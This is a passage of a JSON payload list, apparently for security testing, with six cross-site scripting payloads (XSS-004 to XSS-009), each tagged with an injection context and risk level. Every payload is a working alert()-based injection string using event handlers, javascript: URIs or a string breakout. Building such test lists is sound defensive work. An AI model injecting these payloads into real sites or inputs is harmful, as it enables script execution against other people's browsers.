    { "id": "XSS-004", "name": "Body Onload Event", "payload": "<body onload=alert('XSS')>", "context": "dom_event", "risk": "high" },
    { "id": "XSS-005", "name": "Iframe Javascript URI", "payload": "<iframe src='javascript:alert(\"XSS\")'></iframe>", "context": "iframe_uri", "risk": "high" },
    { "id": "XSS-006", "name": "Input Autofocus Onfocus", "payload": "<input onfocus=alert('XSS') autofocus>", "context": "autofocus_event", "risk": "medium" },
    { "id": "XSS-007", "name": "Details Tag Ontoggle", "payload": "<details open ontoggle=alert('XSS')>", "context": "html5_element", "risk": "medium" },
    { "id": "XSS-008", "name": "Video Source Onerror", "payload": "<video src=x onerror=alert('XSS')>", "context": "media_element", "risk": "medium" },
    { "id": "XSS-009", "name": "JavaScript Context Breakout", "payload": "'-alert(1)-'", "context": "javascript_literal", "risk": "high" },
